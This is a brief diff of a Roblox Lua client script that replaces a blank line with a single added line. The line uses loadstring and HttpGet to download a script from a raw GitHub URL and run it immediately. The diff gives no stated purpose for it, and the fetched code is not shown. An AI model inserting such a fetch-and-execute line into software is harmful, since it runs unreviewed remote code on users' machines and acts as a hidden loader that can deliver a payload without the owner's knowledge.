@@ -14,7 +14,7 @@ local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
 local Mouse = Player:GetMouse()
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tomdagoat-bot/GerpUI/refs/heads/main/Download", true))()
 
 local Inputs = {}
 local Assets = ReplicatedStorage:WaitForChild("Assets")
